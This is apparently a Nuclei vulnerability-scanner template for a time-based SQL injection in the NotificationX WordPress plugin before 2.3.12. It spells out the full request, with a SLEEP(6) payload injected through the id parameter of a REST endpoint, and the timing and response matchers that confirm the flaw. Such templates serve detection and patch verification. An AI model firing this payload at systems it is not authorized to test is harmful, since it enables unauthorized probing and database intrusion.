http:
- extractors:
  - group: 1
    internal: true
    name: apikey
    regex:
    - '"home":"(.*?)",'
    type: regex
  matchers:
  - condition: and
    dsl:
    - duration>=6
    - status_code == 401
    - contains(content_type, "application/json")
    - contains(body, "There is no notification created with this id")
    type: dsl
  raw:
  - 'GET /wp-json/ HTTP/1.1

    Host: {{Hostname}}

    '
  - '@timeout: 10s

    GET /wp-json/notificationx/v1/notification/1?api_key={{md5(''{{apikey}}'')}}&id[1]=%3d(SELECT/**/1/**/WHERE/**/SLEEP(6))
    HTTP/1.1

    Host: {{Hostname}}

    '
id: notificationx-sqli
info:
  author: theamanrawat
  description: 'The plugin does not validate and escape the id parameter in its notificationx/v1/notification
    REST endpoint before using it in a SQL statement, which could allow unauthenticated
    attackers to perform SQL Injection attacks.

    '
  metadata:
    max-request: 2
    verified: true
  name: NotificationX < 2.3.12 - SQL Injection
  reference:
  - https://wpscan.com/vulnerability/d1480717-726d-4be2-95cb-1007a3f010bb
  - https://wordpress.org/plugins/notificationx/
  remediation: Fixed in version 2.3.12
  severity: high
  tags: time-based-sqli,wpscan,sqli,wp,wp-plugin,wordpress,notificationx-sql-injection,vuln
